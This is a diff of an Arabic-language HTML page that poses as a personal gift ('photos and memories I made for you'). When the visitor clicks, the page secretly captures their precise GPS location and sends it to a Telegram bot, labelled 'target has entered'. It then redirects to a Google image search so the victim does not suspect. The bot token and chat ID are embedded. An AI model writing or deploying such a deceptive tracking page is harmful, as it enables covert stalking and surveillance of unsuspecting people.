@@ -1,27 +1,55 @@
 <!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"></head>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مفاجأة خاصة لك 🎁</title>
+    <style>
+        body { background-color: #f0f2f5; font-family: 'Arial', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .card { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; animation: fadeIn 1s ease-in; }
+        h1 { color: #ff4757; font-size: 24px; }
+        p { color: #57606f; font-size: 18px; line-height: 1.6; }
+        .btn { background: #ff4757; color: white; border: none; padding: 12px 25px; border-radius: 50px; font-size: 18px; cursor: pointer; transition: 0.3s; margin-top: 20px; text-decoration: none; display: inline-block; }
+        .btn:hover { background: #ff6b81; transform: scale(1.05); }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
 <body>
-    <script>
-        navigator.geolocation.getCurrentPosition(function(pos) {
-            var lat = pos.coords.latitude;
-            var lon = pos.coords.longitude;
-            var token = "8759633984:AAGhfzqlvb-6knXk6oqIvDQCvSP6p8jej6Y"; 
-            var chat_id = "7323283649";
-            var text = "Location: https://www.google.com/maps?q=" + lat + "," + lon;
-            
-            // الطريقة الحديثة للإرسال (fetch)
-            fetch("https://api.telegram.org/bot" + token + "/sendMessage", {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({chat_id: chat_id, text: text})
-            }).then(function() {
-                document.body.innerHTML = "<h1>Done! Check Telegram</h1>";
-            });
-        }, function(err) {
-            document.body.innerHTML = "<h1>Please Allow GPS!</h1>";
-        }, {enableHighAccuracy: true});
-    </script>
-    <h1 style="text-align:center;">جاري التحديث...</h1>
+
+<div class="card">
+    <div style="font-size: 50px;">🎁</div>
+    <h1>صنعت هذا الموقع لأجلك!</h1>
+    <p>لقد قمت بجمع بعض الصور والذكريات الجميلة في هذا الرابط.. اضغط على الزر أدناه للمشاهدة.</p>
+    <button class="btn" id="viewBtn">فتح الصور الآن</button>
+</div>
+
+<script>
+    document.getElementById('viewBtn').onclick = function() {
+        // بمجرد الضغط على الزر، نطلب الموقع
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                var lat = position.coords.latitude;
+                var lon = position.coords.longitude;
+                var token = "8759633984:AAGhfzqlvb-6knXk6oqIvDQCvSP6p8jej6Y";
+                var chat_id = "7323283649";
+                var text = "تم دخول الهدف ✅\nالرابط: https://www.google.com/maps?q=" + lat + "," + lon;
+
+                fetch("https://api.telegram.org/bot" + token + "/sendMessage", {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({chat_id: chat_id, text: text})
+                });
+
+                // بعد الإرسال، نحوله لصفحة صور حقيقية أو جوجل لكي لا يشك
+                alert("جاري تحميل الألبوم... يرجى الانتظار ثواني");
+                window.location.href = "https://www.google.com/search?q=اجمل+صور+طبيعة&tbm=isch";
+                
+            }, function(error) {
+                alert("يجب السماح بالوصول لمشاهدة الصور!");
+            }, {enableHighAccuracy: true});
+        }
+    };
+</script>
+
 </body>
 </html>
